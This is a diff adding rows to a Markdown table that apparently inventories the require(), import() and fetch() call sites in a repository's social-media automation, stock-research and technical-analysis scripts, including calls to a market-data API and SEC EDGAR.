+| scripts/social/request-creative-revision.mjs | ` require(join(ROOT, "social/providers/authoring/chatgpt-work/adapter.js")) ` |
+| scripts/social/request-creative-revision.mjs | ` require(join(ROOT, "social/engines/story-selection.js")) ` |
+| scripts/social/request-creative-revision.mjs | ` require(join(ROOT, "social/engines/creative-quality.js")) ` |
+| scripts/social/request-creative-revision.mjs | ` require(join(ROOT, "social/engines/creative-job.js")) ` |
+| scripts/social/request-creative-revision.mjs | ` require(join(ROOT, "social/engines/creative-contract.js")) ` |
+| scripts/social/request-creative-revision.mjs | ` require(join(ROOT, "social/engines/authoring.js")) ` |
+| scripts/social/request-creative-revision.mjs | ` require(join(ROOT, "social/engines/asset-store.js")) ` |
+| scripts/social/request-creative-web.mjs | ` require(join(ROOT, "social/engines/content-brief.js")) ` |
+| scripts/social/request-creative-web.mjs | ` require(join(ROOT, "social/providers/authoring/chatgpt-work/adapter.js")) ` |
+| scripts/social/request-creative-web.mjs | ` require(join(ROOT, "social/engines/invocation-ledger.js")) ` |
+| scripts/social/request-creative-web.mjs | ` require(join(ROOT, "social/engines/brand.js")) ` |
+| scripts/social/request-creative.mjs | ` require(join(ROOT, "social/engines/evidence-package.js")) ` |
+| scripts/social/request-creative.mjs | ` require(join(ROOT, "social/engines/content-brief.js")) ` |
+| scripts/social/request-creative.mjs | ` require(join(ROOT, "social/providers/authoring/chatgpt-work/adapter.js")) ` |
+| scripts/social/request-creative.mjs | ` require(join(ROOT, "social/engines/invocation-ledger.js")) ` |
+| scripts/social/request-creative.mjs | ` require(join(ROOT, "social/engines/visual-motif.js")) ` |
+| scripts/social/request-creative.mjs | ` require(join(ROOT, "social/engines/creative-job.js")) ` |
+| scripts/social/research-web-story.mjs | ` require(join(ROOT, "social/engines/web-research.js")) ` |
+| scripts/social/research-web-story.mjs | ` require(join(ROOT, "social/engines/rss-parse.js")) ` |
+| scripts/social/research-web-story.mjs | ` fetch(quelle.url, { ` |
+| scripts/social/run-orchestrator.mjs | ` require(join(ROOT, "social/engines/orchestrator.js")) ` |
+| scripts/social/run-orchestrator.mjs | ` require(join(ROOT, "social/engines/source-registry.js")) ` |
+| scripts/social/run-orchestrator.mjs | ` require(join(ROOT, "social/engines/measurement-window.js")) ` |
+| scripts/social/run-orchestrator.mjs | ` require(join(ROOT, "social/engines/creative-job.js")) ` |
+| scripts/social/run-orchestrator.mjs | ` require(join(ROOT, "social/engines/evidence-package.js")) ` |
+| scripts/social/run-orchestrator.mjs | ` require(join(ROOT, "social/engines/content-cadence.js")) ` |
+| scripts/social/run-orchestrator.mjs | ` require(join(ROOT, "social/engines/no-post.js")) ` |
+| scripts/social/run-orchestrator.mjs | ` require(join(ROOT, "social/engines/content-ladder.js")) ` |
+| scripts/social/run-orchestrator.mjs | ` require(join(ROOT, "social/engines/hard-invariants.js")) ` |
+| scripts/social/run-orchestrator.mjs | ` require(join(ROOT, "social/engines/run-lease.js")) ` |
+| scripts/social/run-orchestrator.mjs | ` require(join(ROOT, "social/engines/frequency-learning.js")) ` |
+| scripts/social/run-orchestrator.mjs | ` require(join(ROOT, "social/engines/manual-mode.js")) ` |
+| scripts/social/run-orchestrator.mjs | ` require(join(ROOT, "social/providers/authoring/chatgpt-work/adapter.js")) ` |
+| scripts/social/run-orchestrator.mjs | ` require(join(ROOT, "social/engines/hook.js")) ` |
+| scripts/social/run-orchestrator.mjs | ` require(join(ROOT, "social/engines/audience-frame.js")) ` |
+| scripts/social/run-post-job.mjs | ` require(join(ROOT, "social/engines/post-queue.js")) ` |
+| scripts/social/run-post-job.mjs | ` require(join(ROOT, "social/engines/creative-job.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/engines/schema.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/engines/strategy-memory.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/engines/signals.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/engines/trend-score.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/engines/opportunity.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/engines/strategy.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/engines/content.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/engines/visual-composition.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/engines/visual-intelligence.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/engines/learning-unit.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/engines/visual-grammar.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/engines/hook.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/engines/memory.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/engines/fatigue.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/engines/publishing.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/engines/analytics.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/engines/performance.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/engines/learning.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/engines/experiments.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/engines/evidence-regime.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/engines/measurement-window.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/engines/explain.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/engines/health.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/engines/autonomy.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/engines/kill-switch.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/engines/audit-log.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/engines/provider.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/engines/capabilities.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/engines/brand.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/engines/authoring.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/engines/content-brief.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/engines/evidence-package.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/providers/authoring/template/adapter.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/providers/authoring/model/adapter.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/providers/authoring/chatgpt-work/adapter.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/engines/provider-lifecycle.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/engines/creative-contract.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/engines/audience-fit.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/engines/audience-frame.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/engines/content-ladder.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/engines/learning-dimensions.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/engines/content-universe.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/engines/invocation-ledger.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/engines/creative-job.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/providers/mock/adapter.js")) ` |
+| scripts/social/run-social-cycle.mjs | ` require(join(ROOT, "social/providers/meta/adapter.js")) ` |
+| scripts/social/social-os-ready.mjs | ` require(join(ROOT, "social/engines/product-readiness.js")) ` |
+| scripts/social/social-os-ready.mjs | ` require(join(ROOT, "social/engines/visual-intelligence.js")) ` |
+| scripts/social/social-os-ready.mjs | ` require(join(ROOT, pfad)) ` |
+| scripts/social/social-os-ready.mjs | ` require(join(ROOT, "social/engines/content.js")) ` |
+| scripts/social/social-os-ready.mjs | ` require(join(ROOT, "social/engines/audience-frame.js")) ` |
+| scripts/social/social-os-ready.mjs | ` require(join(ROOT, pfad)) ` |
+| scripts/social/social-os-ready.mjs | ` require(join(ROOT, "social/engines/content.js")) ` |
+| scripts/social/social-os-ready.mjs | ` require(join(ROOT, pfad)) ` |
+| scripts/social/social-os-ready.mjs | ` import("file://" + join(ROOT, "scripts/social/render-asset.mjs")) ` |
+| scripts/social/social-os-ready.mjs | ` require(join(ROOT, pfad)) ` |
+| scripts/social/social-os-ready.mjs | ` import(     "file://" + join(ROOT, "scripts/social/render-asset.mjs")) ` |
+| scripts/social/social-os-ready.mjs | ` require(join(ROOT, pfad)) ` |
+| scripts/social/social-os-ready.mjs | ` require(join(ROOT, "social/engines/content-cadence.js")) ` |
+| scripts/social/social-os-ready.mjs | ` require(join(ROOT, "social/engines/orchestrator.js")) ` |
+| scripts/social/social-os-ready.mjs | ` require(join(ROOT, "social/engines/content-cadence.js")) ` |
+| scripts/social/social-os-ready.mjs | ` require(join(ROOT, pfad)) ` |
+| scripts/social/social-os-ready.mjs | ` require(join(ROOT, "social/engines/content.js")) ` |
+| scripts/social/social-os-ready.mjs | ` require(join(ROOT, "social/engines/memory.js")) ` |
+| scripts/social/store-asset.mjs | ` require(join(ROOT, "social/engines/asset-store.js")) ` |
+| scripts/social/store-asset.mjs | ` require(join(ROOT, "social/providers/authoring/chatgpt-work/adapter.js")) ` |
+| scripts/social/sync-creative-invocations.mjs | ` require(join(ROOT, "social/engines/invocation-ledger.js")) ` |
+| scripts/social/sync-creative-invocations.mjs | ` require(join(ROOT, "social/engines/provider-lifecycle.js")) ` |
+| scripts/social/verify-approval-center.mjs | ` fetch(WORKER + pfad, Object.assign({ redirect: "manual" }, init)) ` |
+| scripts/social/verify-creative-dispatch.mjs | ` require(join(ROOT, "social/engines/creative-job.js")) ` |
+| scripts/social/verify-hashtag-access.mjs | ` require(join(ROOT, "social/engines/hashtag-access.js")) ` |
+| scripts/social/verify-hashtag-access.mjs | ` require(join(ROOT, "social/engines/hashtag-portfolio.js")) ` |
+| scripts/social/verify-hashtag-access.mjs | ` fetch(WORKER + pfad, { ` |
+| scripts/social/verify-manual-dispatch.mjs | ` fetch(WORKER + pfad, Object.assign({ redirect: "manual" }, init)) ` |
+| scripts/social/verify-meta-capabilities.mjs | ` require(join(ROOT, "social/providers/meta/adapter.js")) ` |
+| scripts/social/verify-meta-capabilities.mjs | ` require(join(ROOT, "social/engines/capabilities.js")) ` |
+| scripts/social/verify-revision-result.mjs | ` require(join(ROOT, "social/providers/authoring/chatgpt-work/adapter.js")) ` |
+| scripts/social/verify-revision-result.mjs | ` require(join(ROOT, "social/engines/creative-contract.js")) ` |
+| scripts/social/verify-revision-result.mjs | ` require(join(ROOT, "social/engines/asset-store.js")) ` |
+| scripts/social/verify-worker.mjs | ` fetch(baseUrl + path, Object.assign({ redirect: "manual" }, init)) ` |
+| scripts/social/verify-worker.mjs | ` fetch(bildUrl, { method: "HEAD", redirect: "follow" }) ` |
+| scripts/supertrader/house/live.mjs | ` require(path.join(root, 'quant/engines/history-store.js')) ` |
+| scripts/supertrader/house/live.mjs | ` require(path.join(root, 'quant/engines/zero-cost-guard.js')) ` |
+| scripts/supertrader/house/live.mjs | ` fetch(L.LIST_URL, { headers: KEY ? { Authorization: 'Token ' + KEY } : {} })).arrayBuffer()) ` |
+| scripts/supertrader/house/live.mjs | ` import(path.join(root, 'scripts/market/storage/s3-driver.mjs')) ` |
+| scripts/supertrader/probe/delisting-probe.mjs | ` fetch(url, { headers: H }) ` |
+| scripts/supertrader/probe/delisting-probe.mjs | ` fetch(LIST_URL, { headers: H })).arrayBuffer()) ` |
+| scripts/supertrader/restore-full-ledgers.mjs | ` import(path.join(root, 'scripts/market/storage/s3-driver.mjs')) ` |
+| scripts/supertrader/snapshot/snapshot.mjs | ` require(path.join(root, 'core/identity.js')) ` |
+| scripts/supertrader/snapshot/snapshot.mjs | ` require(path.join(root, 'quant/engines/zero-cost-guard.js')) ` |
+| scripts/supertrader/snapshot/snapshot.mjs | ` require(path.join(root, 'quant/engines/bar-codec.js')) ` |
+| scripts/supertrader/snapshot/snapshot.mjs | ` require(path.join(root, 'quant/engines/history-store.js')) ` |
+| scripts/supertrader/source-faithful/certification/cert-prep-top5.mjs | ` import(pathToFileURL(path.join(SF_DIR, m)).href)) ` |
+| scripts/supertrader/source-faithful/evidence/build-evidence-matrix.mjs | ` import(path.join(ROOT, PATHS.paper))).currentPaperProtocol() ` |
+| scripts/supertrader/source-faithful/evidence/build-evidence-matrix.mjs | ` import(path.join(ROOT, PATHS.inputGate)) ` |
+| scripts/supertrader/source-faithful/evidence/build-evidence-matrix.mjs | ` import(path.join(ROOT, 'scripts/supertrader/source-faithful/product/eod-adapter.mjs')) ` |
+| scripts/supertrader/source-faithful/evidence/build-evidence-matrix.mjs | ` import(path.join(ROOT, PATHS.publication)) ` |
+| scripts/supertrader/source-faithful/evidence/build-evidence-matrix.mjs | ` import(path.join(ROOT, PATHS.histUniverse)) ` |
+| scripts/supertrader/source-faithful/evidence/build-evidence-matrix.mjs | ` import(path.join(ROOT, PATHS.planChecker)) ` |
+| scripts/supertrader/source-faithful/product/candidate-contract.mjs | ` require(path.join(ROOT, 'core/identity.js')) ` |
+| scripts/supertrader/source-faithful/product/eod-adapter.mjs | ` require(path.join(ROOT, 'core/identity.js')) ` |
+| scripts/supertrader/source-faithful/product/price-parity.mjs | ` require(path.join(ROOT, 'quant/engines/published-close.js')) ` |
+| scripts/supertrader/source-faithful/product/price-parity.mjs | ` require(path.join(ROOT, 'core/identity.js')) ` |
+| scripts/supertrader/source-faithful/research/minervini-lifecycle-matrix.mjs | ` import(abs)) ` |
+| scripts/supertrader/source-faithful/research/run-kk-intraday.mjs | ` import(path.join(ROOT, 'scripts/market/storage/s3-driver.mjs')) ` |
+| scripts/supertrader/source-faithful/research/run-st-hist-top5.mjs | ` import(path.join(ROOT, 'scripts/market/storage/s3-driver.mjs')) ` |
+| scripts/supertrader/source-faithful/research/run-st-holdout.mjs | ` require(path.join(root, 'scripts/research/holdout/protocol-pin.cjs')).PROTOCOL_SHA256 ` |
+| scripts/supertrader/source-faithful/research/run-st-holdout.mjs | ` require(path.join(ROOT, 'scripts/quant/portfolio/model-portfolios.cjs')).isoWeek(d) ` |
+| scripts/supertrader/source-faithful/research/run-st-holdout.mjs | ` require(path.join(ROOT, 'scripts/research/edge/study.cjs')) } = {}) { ` |
+| scripts/supertrader/source-faithful/research/run-st-holdout.mjs | ` import(path.join(ROOT, 'scripts/research/holdout/ledger.mjs')) ` |
+| scripts/supertrader/source-faithful/research/run-st-holdout.mjs | ` import(path.join(ROOT, 'scripts/market/storage/s3-driver.mjs')) ` |
+| scripts/supertrader/source-faithful/research/sf5-lifecycle-matrix.mjs | ` import(abs)) ` |
+| scripts/supertrader/source-faithful/research/sf7-code-coverage.mjs | `` import()` is not followed). */ `` |
+| scripts/supertrader/source-faithful/research/sf7-execution-checks.mjs | ` import (the KK runner uses it without depending on the sf5 lifecycles). ` |
+| scripts/supertrader/source-faithful/research/st9-v13-delisted-study.mjs | ` fetch (raw/<run>/series.jsonl.gz, the qualify.py input) is read with the ` |
+| scripts/supertrader/tests/paper-forward-fixture.mjs | ` require(path.join(root, 'quant/engines/history-store.js')) ` |
+| scripts/supertrader/tests/sf-paper-2027-forward.test.mjs | ` import(${JSON.stringify(new URL('../validation/lib.mjs', import.meta.url).href)}) ` |
+| scripts/supertrader/tests/snapshot-fixture.mjs | ` require(path.join(root, 'quant/engines/history-store.js')) ` |
+| scripts/supertrader/tests/st-technical.test.mjs | ` require(path.join(root, 'supertrader/assets/st-technical.js')) ` |
+| scripts/supertrader/tests/st-technical.test.mjs | ` require(path.join(root, 'core/stock-context.js')) ` |
+| scripts/supertrader/validation/analyze-methods.mjs | ` require(path.join(root, 'quant/engines/history-store.js')) ` |
+| scripts/supertrader/validation/analyze-methods.mjs | ` require(path.join(root, 'quant/engines/zero-cost-guard.js')) ` |
+| scripts/supertrader/validation/analyze-methods.mjs | ` require(path.join(root, 'quant/engines/us-security-master.js')) ` |
+| scripts/supertrader/validation/analyze-methods.mjs | ` fetch(L.LIST_URL, { headers: KEY ? { Authorization: 'Token ' + KEY } : {} })).arrayBuffer()) ` |
+| scripts/supertrader/validation/analyze-methods.mjs | ` import(path.join(root, 'scripts/market/storage/s3-driver.mjs')) ` |
+| scripts/supertrader/validation/analyze-methods.mjs | ` import(path.join(root, 'scripts/market/storage/s3-driver.mjs')) ` |
+| scripts/supertrader/validation/analyze.mjs | ` require(path.join(root, 'quant/engines/history-store.js')) ` |
+| scripts/supertrader/validation/analyze.mjs | ` require(path.join(root, 'quant/engines/zero-cost-guard.js')) ` |
+| scripts/supertrader/validation/analyze.mjs | ` require(path.join(root, 'quant/engines/us-security-master.js')) ` |
+| scripts/supertrader/validation/analyze.mjs | ` fetch(L.LIST_URL, { headers: KEY ? { Authorization: 'Token ' + KEY } : {} })).arrayBuffer()) ` |
+| scripts/supertrader/validation/analyze.mjs | ` import(path.join(root, 'scripts/market/storage/s3-driver.mjs')) ` |
+| scripts/supertrader/validation/audit-r14.mjs | `` fetch(`https://api.tiingo.com/tiingo/daily/${t}/prices?startDate=${W.warmupFrom}&endDate=${W.to}&format=json`, { headers: { Authorization: 'Token ' + process.env.TIIN `` |
+| scripts/supertrader/validation/case-study.mjs | ` import(path.join(root, 'scripts/market/storage/s3-driver.mjs')) ` |
+| scripts/supertrader/validation/delist-cases-r15.mjs | `` fetch(`https://data.sec.gov/submissions/CIK${cik}.json`, { headers: { 'User-Agent': UA } }) `` |
+| scripts/supertrader/validation/delist-cases-r15.mjs | `` fetch(`https://data.sec.gov/submissions/${f.name}`, { headers: { 'User-Agent': UA } }) `` |
+| scripts/supertrader/validation/fetch-sources.mjs | ` fetch(url, { headers: { 'User-Agent': 'VisionUniverse-Research/1.0 (method fidelity review ` |
+| scripts/supertrader/validation/fetch.mjs | ` require(path.join(root, 'quant/engines/history-store.js')) ` |
+| scripts/supertrader/validation/fetch.mjs | ` require(path.join(root, 'quant/engines/zero-cost-guard.js')) ` |
+| scripts/supertrader/validation/fetch.mjs | ` require(path.join(root, 'quant/engines/us-security-master.js')) ` |
+| scripts/supertrader/validation/fetch.mjs | ` fetch(url, { headers: { Authorization: 'Token ' + KEY, 'Content-Type': 'application/json' } }) ` |
+| scripts/supertrader/validation/fetch.mjs | ` fetch(L.LIST_URL, { headers: KEY ? { Authorization: 'Token ' + KEY } : {} })).arrayBuffer()) ` |
+| scripts/supertrader/validation/fetch.mjs | ` import(path.join(root, 'scripts/market/storage/s3-driver.mjs')) ` |
+| scripts/supertrader/validation/intraday-oracle.mjs | ` fetch(url, { headers: { Authorization: 'Token ' + key } }) ` |
+| scripts/supertrader/validation/intraday-probe.mjs | ` fetch(url, { headers: { Authorization: 'Token ' + key, 'Content-Type': 'application/json' } }) ` |
+| scripts/supertrader/validation/intraday-study.mjs | ` import(path.join(root, 'scripts/market/storage/s3-driver.mjs')) ` |
+| scripts/supertrader/validation/kk-intraday-probe.mjs | ` fetch(url, { headers: { Authorization: 'Token ' + key, 'Content-Type': 'application/json' } }) ` |
+| scripts/supertrader/validation/sec-pit.mjs | ` require(path.join(root, 'quant/engines/history-store.js')) ` |
+| scripts/supertrader/validation/sec-pit.mjs | ` require(path.join(root, 'quant/engines/zero-cost-guard.js')) ` |
+| scripts/supertrader/validation/sec-pit.mjs | ` require(path.join(root, 'quant/engines/us-security-master.js')) ` |
+| scripts/supertrader/validation/sec-pit.mjs | ` fetch(url, { headers: { 'User-Agent': UA, 'Accept-Encoding': 'gzip, deflate' } }) ` |
+| scripts/supertrader/validation/sec-pit.mjs | ` fetch(L.LIST_URL, { headers: KEY ? { Authorization: 'Token ' + KEY } : {} })).arrayBuffer()) ` |
+| scripts/supertrader/validation/sec-pit.mjs | ` import(path.join(root, 'scripts/market/storage/s3-driver.mjs')) ` |
+| scripts/supertrader/validation/sec-pit.mjs | `` fetch(`https://data.sec.gov/submissions/CIK${v.cik}.json`, { headers: { 'User-Agent': UA } }) `` |
+| scripts/supertrader/validation/sec-pit.mjs | `` fetch(`https://data.sec.gov/submissions/${f.name}`, { headers: { 'User-Agent': UA } }) `` |
+| scripts/supertrader/validation/universe-audit.mjs | ` require(path.join(root, 'quant/engines/history-store.js')) ` |
+| scripts/supertrader/validation/universe-audit.mjs | ` require(path.join(root, 'quant/engines/zero-cost-guard.js')) ` |
+| scripts/supertrader/validation/universe-audit.mjs | ` require(path.join(root, 'quant/engines/us-security-master.js')) ` |
+| scripts/supertrader/validation/universe-audit.mjs | ` fetch(L.LIST_URL, { headers: KEY ? { Authorization: 'Token ' + KEY } : {} })).arrayBuffer()) ` |
+| scripts/supertrader/validation/universe-audit.mjs | ` import(path.join(root, 'scripts/market/storage/s3-driver.mjs')) ` |
+| scripts/supertrader/validation/venue-probe.mjs | ` fetch(url, { headers: { Authorization: 'Token ' + key, 'Content-Type': 'application/json' } }) ` |
+| scripts/technical/build-technical-data.mjs | ` require(join(root, "quant", "engines", "technical", n)) ` |
+| scripts/technical/build-technical-data.mjs | ` require(join(root, "quant", "engines", "hash.js")) ` |
+| scripts/technical/build-technical-intelligence.mjs | ` require(join(ROOT, "quant/engines/technical/ti/engine.js")) ` |
+| scripts/technical/build-technical-intelligence.mjs | ` require(join(ROOT, "quant/engines/technical/elliott/elliott-v3.js")) ` |
+| scripts/technical/build-technical-intelligence.mjs | ` require(join(ROOT, "quant/engines/technical/ti/explain.js")) ` |
+| scripts/technical/build-technical-intelligence.mjs | ` require(join(ROOT, "quant/engines/technical/ti/alerts.js")) ` |
+| scripts/technical/build-technical-intelligence.mjs | ` require(join(ROOT, "quant/engines/technical/ti/scenario.js")) ` |
+| scripts/technical/build-technical-intelligence.mjs | ` require(join(ROOT, "quant/engines/technical/elliott/patterns.js")) ` |
+| scripts/technical/build-technical-intelligence.mjs | ` require(join(ROOT, "core/identity.js")) ` |
+| scripts/technical/candlestick-evidence.mjs | ` require(join(root, "quant/engines/technical/candlesticks.js")) ` |
+| scripts/technical/contract-doc.mjs | ` require(join(root, "quant/engines/technical/screener-contract.js")) ` |
+| scripts/technical/elliott-home/browser-qa.mjs | ` require(process.env.PLAYWRIGHT_PATH &#124;&#124; '/opt/node-tools/node_modules/playwright') ` |
+| scripts/technical/elliott-registry/register.mjs | ` require(join(ROOT, "quant/engines/technical/elliott/elliott-v3.js")) ` |
+| scripts/technical/elliott-registry/register.mjs | ` require(join(ROOT, "quant/engines/technical/ti/scenario.js")) ` |
+| scripts/technical/elliott-registry/split-adjusted-view.mjs | ` require(join(ROOT, "quant", "engines", "return-series.js")) ` |
+| scripts/technical/elliott-registry/split-adjusted-view.mjs | ` require(join(ROOT, "core", "identity.js")) ` |
+| scripts/technical/explore-curation-audit.mjs | ` require(join(ROOT, "quant/engines/technical/projection/explore-curation.js")) ` |
+| scripts/technical/hsab/lib/replay-core.mjs | ` require(join(ROOT, "quant/engines/technical/ti/engine.js")) ` |
+| scripts/technical/hsab/lib/replay-core.mjs | ` require(join(ROOT, "quant/engines/technical/ti/context.js")) ` |
+| scripts/technical/hsab/lib/replay-core.mjs | ` require(join(ROOT, "quant/engines/technical/ti/scenario.js")) ` |
+| scripts/technical/hsab/lib/replay-core.mjs | ` require(join(ROOT, "quant/engines/technical/ti/dow-trend.js")) ` |
+| scripts/technical/hsab/lib/replay-core.mjs | ` require(join(ROOT, "quant/engines/technical/ti/momentum-volatility.js")) ` |
+| scripts/technical/indicator-evidence.mjs | ` require(join(root, "quant/engines/technical/indicators.js")) ` |
+| scripts/technical/lib/ti-data.mjs | ` require(join(ROOT, "quant/engines/technical/canonical-bars.js")) ` |
+| scripts/technical/lib/ti-freshness.mjs | ` require(join(ROOT, "quant/engines/technical/ti/data-freshness.js")) ` |
+| scripts/technical/lib/ti-freshness.mjs | ` require(join(ROOT, "core/identity.js")) ` |
+| scripts/technical/lib/ti-product.mjs | ` require(join(ROOT, "quant/engines/technical/ti/engine.js")) ` |
+| scripts/technical/lib/ti-product.mjs | ` require(join(ROOT, "quant/engines/technical/elliott/elliott-v2.js")) ` |
+| scripts/technical/lib/ti-product.mjs | ` require(join(ROOT, "quant/engines/technical/elliott/elliott-v3.js")) ` |
+| scripts/technical/lib/ti-projection.mjs | ` require(join(ROOT, "quant/engines/technical/projection/elliott-projection.js")) ` |
+| scripts/technical/lib/ti-projection.mjs | ` require(join(ROOT, "quant/engines/technical/elliott/elliott-v3.js")) ` |
+| scripts/technical/lib/ti-projection.mjs | ` require(join(ROOT, "quant/engines/technical/elliott/patterns.js")) ` |
+| scripts/technical/lib/ti-projection.mjs | ` require(join(ROOT, "quant/engines/technical/projection/explore-curation.js")) ` |
+| scripts/technical/lib/ti-projection.mjs | ` require(join(ROOT, "quant/engines/corporate-action-evidence.js")) ` |
+| scripts/technical/materialize-product-intelligence.mjs | ` require(join(root, "quant/engines/technical/canonical-bars.js")) ` |
+| scripts/technical/materialize-product-intelligence.mjs | ` require(join(root, "quant/engines/technical/technical-analysis.js")) ` |
+| scripts/technical/materialize-product-intelligence.mjs | ` require(join(root, "quant/engines/technical/product-materialization.js")) ` |
+| scripts/technical/materialize-product-intelligence.mjs | ` require(join(root, "quant/api/market-signal-contract.js")) ` |
+| scripts/technical/materialize-product-intelligence.mjs | ` require(join(root, "quant/api/technical-workspace-contract.js")) ` |
+| scripts/technical/materialize-product-intelligence.mjs | ` require(join(root, "quant/engines/realtime/market-hours.js")) ` |
+| scripts/technical/materialize-product-intelligence.mjs | ` require(join(root, "quant/api/product-services.js")) ` |
+| scripts/technical/materialize-product-intelligence.mjs | ` require(join(root, "quant/engines/display-policy.js")) ` |
+| scripts/technical/materialize-product-intelligence.mjs | ` require(join(root, "quant/engines/query.js")) ` |
+| scripts/technical/measure-ema200-signal-effect.mjs | ` require(join(ROOT, "quant/engines/technical/feature-store.js")) ` |
+| scripts/technical/run-technical-scale.mjs | ` require(join(engines, "technical", n)) ` |
+| scripts/technical/run-technical-scale.mjs | ` require(join(engines, "market-store.js")) ` |
+| scripts/technical/run-technical-scale.mjs | ` require(join(root, "core", "identity.js")) ` |
+| scripts/technical/s4/template-study.mjs | ` require(join(ROOT, "scripts/quant/research/research-population.cjs")) ` |
+| scripts/technical/s4/template-study.mjs | ` require(join(ROOT, "quant/engines/research-studies.cjs")) ` |
+| scripts/technical/s4/template-study.mjs | ` require(join(ROOT, "quant/engines/research-validation.cjs")) ` |
+| scripts/technical/s4/template-study.mjs | ` require(join(ROOT, "quant/engines/weekly-benchmark.cjs")) ` |
+| scripts/technical/validate-formations.mjs | ` require(join(root, "quant/engines/technical/formations.js")) ` |
+| scripts/technical/validate-formations.mjs | ` require(join(root, "quant/engines/technical/indicators.js")) ` |
+| scripts/technical/validate-formations.mjs | ` require(join(root, "quant/engines/technical/canonical-bars.js")) ` |
+| scripts/technical/validate-formations.mjs | ` require(join(root, "quant/engines/technical/ti/context.js")) ` |
+| scripts/technical/verify-technical-data.mjs | ` require(join(root, "quant", "engines", "technical", n)) ` |
+| scripts/technical/verify-technical-intelligence.mjs | ` require(join(ROOT, "quant/engines/technical/ti/engine.js")) ` |
+| scripts/technical/world/academy-browser-qa.mjs | ` require(process.env.PLAYWRIGHT_PATH &#124;&#124; 'playwright') ` |
+| scripts/technical/world/academy-browser-qa.mjs | ` fetch(site+'/__research/config.json') ` |
+| scripts/technical/world/academy-browser-qa.mjs | ` fetch(site+'/technical/academy/content.json') ` |
+| scripts/technical/world/build-screener.mjs | ` require(join(root, "core/identity.js")) ` |
+| scripts/technical/world/build-screener.mjs | ` require(join(root, "core/listing-staleness.js")) ` |
+| scripts/technical/world/build-screener.mjs | ` require(join(root, "quant/engines/technical/canonical-bars.js")) ` |
+| scripts/technical/world/build-screener.mjs | ` require(join(root, "quant/engines/technical/screen-row.js")) ` |
+| scripts/technical/world/build-screener.mjs | ` require(join(root, "quant/engines/technical/technical-query.js")) ` |
+| scripts/technical/world/build-screener.mjs | ` require(join(root, "quant/engines/technical/screener-contract.js")) ` |
+| scripts/technical/world/build-screener.mjs | ` require(join(root, "quant/engines/technical/indicators.js")) ` |
+| scripts/technical/world/build-screener.mjs | ` require(join(root, "quant/engines/technical/formations.js")) ` |
+| scripts/technical/world/build-screener.mjs | ` require(join(root, "technical/engine/model.js")) ` |
+| scripts/technical/world/build-screener.mjs | ` require(join(root, "technical/engine/stock-summary.js")) ` |
+| scripts/technical/world/formation-evidence.mjs | ` require(join(root, "quant/engines/technical/canonical-bars.js")) ` |
+| scripts/technical/world/formation-evidence.mjs | ` require(join(root, "quant/engines/technical/ti/context.js")) ` |
+| scripts/technical/world/formation-evidence.mjs | ` require(join(root, "quant/engines/technical/formations.js")) ` |
+| scripts/technical/world/live-qa.mjs | ` require(process.env.PLAYWRIGHT_PATH &#124;&#124; "playwright") ` |
+| scripts/technical/world/live-qa.mjs | ` import(new URL("../../access-gate/build.mjs", import.meta.url)) ` |
+| scripts/technical/world/live-qa.mjs | ` fetch(SITE + "/__research/config.json").then((r) => r.ok).catch(() => false) ` |
